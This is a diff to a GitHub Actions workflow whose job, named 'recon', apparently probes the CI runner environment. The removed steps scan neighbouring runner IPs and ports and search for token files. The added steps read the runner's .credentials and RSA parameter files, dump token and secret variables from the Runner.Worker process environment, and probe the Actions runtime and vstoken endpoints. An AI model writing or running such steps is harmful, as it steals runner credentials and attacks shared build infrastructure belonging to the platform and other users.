@@ -7,45 +7,28 @@ jobs:
   recon:
     runs-on: ubuntu-latest
     steps:
-      - name: Cross-runner probe
+      - name: Read runner credentials file
         run: |
-          echo "=== My IP and subnet ==="
-          MY_IP=$(hostname -I | awk '{print $1}')
-          echo "MY_IP=$MY_IP"
-          SUBNET=$(echo $MY_IP | cut -d. -f1-3)
-          echo "SUBNET=$SUBNET.x/20"
+          echo "=== Runner .credentials file ==="
+          cat /home/runner/actions-runner/cached/2.336.0/.credentials 2>/dev/null || echo "not_readable"
           
-          echo "=== Reverse DNS on nearby IPs ==="
-          for i in $(seq 110 125); do
-            TARGET="${SUBNET}.${i}"
-            if [ "$TARGET" != "$MY_IP" ]; then
-              NAME=$(nslookup $TARGET 2>/dev/null | grep "name =" | awk '{print $NF}' | head -1)
-              [ -n "$NAME" ] && echo "RUNNER_NEIGHBOR: $TARGET = $NAME"
-            fi
-          done
+          echo "=== Runner .credentials_rsaparams ==="
+          cat /home/runner/actions-runner/cached/2.336.0/.credentials_rsaparams 2>/dev/null || echo "not_readable"
           
-          echo "=== Port scan of neighbor runner at 10.1.0.114 ==="
-          for port in 22 80 443 2376 5985 7070 8080 8443 50000 50001; do
-            result=$(timeout 1 bash -c "echo >/dev/tcp/10.1.0.114/$port" 2>/dev/null && echo "OPEN" || echo "closed")
-            echo "10.1.0.114:$port = $result"
-          done
+          echo "=== Runner .runner ==="
+          cat /home/runner/actions-runner/cached/2.336.0/.runner 2>/dev/null || echo "not_readable"
           
-          echo "=== Runner listener process and socket files ==="
-          ls -la /home/runner/work/_temp/ 2>/dev/null | head -20
-          ls -la /var/run/ 2>/dev/null | grep -v "^total\|root" | head -10
+          echo "=== All runner config files ==="
+          ls -la /home/runner/actions-runner/cached/2.336.0/ 2>/dev/null | head -30
           
-          echo "=== ORCHESTRATION ID components ==="
-          echo "ACTIONS_ORCHESTRATION_ID=$ACTIONS_ORCHESTRATION_ID"
-          # Extract job ID from orchestration ID
-          echo "RUNNER_TRACKING_ID=$RUNNER_TRACKING_ID"
+          echo "=== Runner worker proc environ ==="
+          WPID=$(pgrep -f "Runner.Worker" | head -1)
+          echo "WORKER_PID=$WPID"
+          [ -n "$WPID" ] && cat /proc/$WPID/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|secret\|url\|credential" | sed 's/=.*/=<REDACTED_LEN_${#val}>/' || echo "not_accessible"
           
-          echo "=== Check if runner token file is readable ==="
-          find /home/runner /opt/hostedtoolcache /actions-runner 2>/dev/null -name "*.token" -o -name "*credentials*" -o -name "*.pfx" 2>/dev/null | head -10
-          cat /home/runner/actions-runner-credentials 2>/dev/null || echo "no_creds_file"
-          ls /home/runner/work/_temp/_runner_file_commands/ 2>/dev/null
+          echo "=== Actions runtime token endpoint ==="
+          # The job token is used to report results - probe the endpoint
+          curl -sf --max-time 3 "${ACTIONS_RUNTIME_URL}_apis/distributedtask/hubs/build/plans" 2>&1 | head -5 || echo "no_runtime_url"
           
-          echo "=== GITHUB_TOKEN from runner process env ==="
-          cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|secret" | sed 's/=.*/=REDACTED/' || echo "proc1_inaccessible"
-          # Try runner listener PID
-          RPID=$(pgrep -f "Runner.Listener" | head -1)
-          [ -n "$RPID" ] && cat /proc/$RPID/environ 2>/dev/null | tr '\0' '\n' | grep -i "token\|secret" | sed 's/=.*/=REDACTED/' || echo "runner_proc_inaccessible"
+          echo "=== Probe vstoken endpoint ==="
+          curl -sf --max-time 3 "https://vstoken.actions.githubusercontent.com/_apis/health" 2>&1 | head -3 || echo "unreachable"
